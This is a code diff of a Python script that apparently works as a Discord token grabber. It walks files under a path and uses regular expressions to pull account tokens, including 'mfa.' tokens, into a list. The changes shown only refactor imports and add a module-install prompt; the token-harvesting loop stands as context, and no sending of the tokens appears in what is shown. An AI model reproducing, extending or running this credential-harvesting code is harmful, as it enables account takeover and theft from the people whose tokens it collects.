@@ -1,8 +1,16 @@
+try:
+    import colorama
+    import os
+    import ctypes
+except ModuleNotFoundError as e:
+    modulename = str(e).split("No module named ")[1].replace("'", "")
+    input(f"Please install module with: pip install {modulename}")
+    exit()
+
 from colorama import Fore, init
 import requests
-from re import findall
+import re
 import os
-import ctypes
 
 init(convert=True)
 
@@ -28,7 +36,7 @@ def main():
                     continue
                 for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                     for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                        for token in findall(regex, line):
+                        for token in re.findall(regex, line):
                             tokens.append(token)
         except:
             pass
